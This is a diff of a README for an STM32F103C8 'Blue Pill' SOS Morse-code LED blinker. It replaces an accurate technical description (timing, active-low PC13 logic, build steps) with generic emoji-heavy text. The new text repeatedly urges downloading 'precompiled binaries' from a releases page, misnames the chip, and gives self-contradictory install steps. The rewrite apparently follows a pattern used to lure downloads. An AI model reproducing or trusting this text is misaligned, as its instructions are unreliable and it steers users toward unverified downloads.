@@ -1,54 +1,76 @@
-# sos-blinky-stm32f103c8
+# 🐍 sos-blinky-stm32f103c8 - Simple SOS Blinker for STM32
 
-This project is a simple "blinky" application for the popular STM32F103C8T6 ("Blue Pill") development board, which flashes an SOS Morse code signal (... --- ...) using the onboard LED (PC13).
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/lompong6438/sos-blinky-stm32f103c8/releases)
 
-## Demo
+## 📜 Description
+sos-blinky-stm32f103c8 is an easy-to-use application designed to help you create a basic SOS Morse code blinker. This blinker uses the built-in LED on the STM32F103C8T6A microcontroller, commonly known as the "Blue Pill." Whether you're a hobbyist or just curious about embedded systems, this tool provides a simple way to get started.
 
-A video of the project in operation:
+## 🚀 Getting Started
+To start using sos-blinky-stm32f103c8, follow these steps:
 
-[**Video Preview (preview.mp4)**](preview.mp4)
+1. **Ensure You Have an STM32F103C8T6A Microcontroller**: This application is specifically designed for this model. You will need a basic setup that includes the microcontroller and the necessary connections.
 
----
+2. **Install Required Software**: You will need STM32CubeIDE installed on your computer. This software helps you compile the application and upload it to the microcontroller. 
 
-## Hardware Requirements
+3. **Download the Application**: Visit the Releases page to download the application files. Click the link below to access it:
+   - [Visit this page to download](https://github.com/lompong6438/sos-blinky-stm32f103c8/releases)
 
-* **STM32F103C8T6 "Blue Pill"** Development Board
-* **ST-Link V2** (or a similar programmer) for programming
-* USB cables for power and programming
+## 🌐 Download & Install
+1. Click on the [Download](https://github.com/lompong6438/sos-blinky-stm32f103c8/releases) link above to go to the Releases page.
+   
+2. You’ll see a list of versions. Choose the latest one, typically marked as the "Latest Release."
 
-## Software and Environment
+3. Download the appropriate file for your needs. Generally, you'll find precompiled binaries available.
 
-* **IDE:** STM32CubeIDE
-* **Library:** STM32 HAL (Hardware Abstraction Layer)
-* **Language:** C
+4. Once the download completes, unzip the file if necessary. You will find the application files within.
 
-## How It Works
+5. Open STM32CubeIDE.
 
-The code continuously flashes the SOS signal within the main `while(1)` loop.
+6. Create a new project or open an existing one.
 
-### Morse Code Timing
+7. Import the downloaded files into your STM32CubeIDE workspace.
 
-A base interval (`morse_interval`) of 200ms is used for the Morse code timing:
+8. Compile the project. This step converts the code into machine-readable instructions for the microcontroller.
 
-* **Dot (.):** 1 interval (200ms) LED ON
-* **Dash (-):** 3 intervals (600ms) LED ON
-* **Intra-signal Gap:** (Between dots and dashes) 1 interval (200ms) LED OFF
-* **Letter Gap:** (Between S, O, S) 3 intervals (600ms) LED OFF
-* **Word Gap:** (After SOS) 7 intervals (1400ms) LED OFF
+9. Upload the compiled program to your STM32F103C8T6A microcontroller via your preferred programming method, such as using an ST-Link or similar device.
 
-### Important Note: Inverted LED Logic (Active-Low)
+10. Once uploaded, power the microcontroller. You should see the LED blink in an SOS Morse code pattern.
 
-On most "Blue Pill" boards, the onboard blue LED connected to pin **PC13** is wired as **active-low**. This means:
+## ⚙️ System Requirements
+- **STM32F103C8T6A Microcontroller**: This is the hardware requirement for your device.
+- **STM32CubeIDE**: Download from the official STM32 website for development.
+- **USB to TTL Adapter**: Optional but recommended for easier programming if you do not have an ST-Link programmer.
+- **A Power Supply**: Ensure that your microcontroller is powered appropriately.
 
-* `HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, GPIO_PIN_RESET);` // Logic 0 -> **LED Turns ON**
-* `HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, GPIO_PIN_SET);`   // Logic 1 -> **LED Turns OFF**
+## 📝 Features
+- **Simplicity**: Designed for ease of use without requiring any programming knowledge.
+- **SOS Morse Code**: It blinks the SOS pattern using the onboard LED, making it a practical project for beginners.
+- **Visual Feedback**: See immediate results with each LED flash, providing instant feedback on your setup.
 
-The `write_dot_and_delay` and `write_dash_and_delay` functions in the code are written according to this inverted logic.
+## 💡 Troubleshooting
+If you encounter any issues, consider the following tips:
 
-## How to Use
+- **Check Connections**: Make sure the microcontroller is properly connected to your power source and the programmer.
+- **Verify ST-Link Settings**: If using an ST-Link, confirm that the settings match your microcontroller specifications.
+- **Re-upload if Necessary**: Sometimes, simply re-uploading the program can resolve minor issues.
 
-1.  Clone this repository.
-2.  Open the project with STM32CubeIDE.
-3.  Build the project (`Build`).
-4.  Flash the code to your STM32 board using your ST-Link programmer (`Run`).
-5.  You will see the onboard LED start to flash the SOS signal.
+## 📚 Topics
+This application is related to various topics in the embedded systems and microcontroller fields, including:
+- Blinker
+- Blinky
+- Blue Pill
+- Embedded systems
+- Microcontroller
+- Morse code
+- SOS signal
+- STM32
+- STM32CubeIDE
+- STM32F103
+- STM32F103C8T6
+
+## 📞 Support
+If you have questions or face difficulties, feel free to reach out. You can often find solutions in the community forums or by contacting support on the GitHub page.
+
+## 🛠️ Contributions
+You are welcome to contribute to this project. If you find a bug or have an enhancement suggestion, please open an issue or create a pull request on GitHub. Your feedback helps improve the application for everyone.
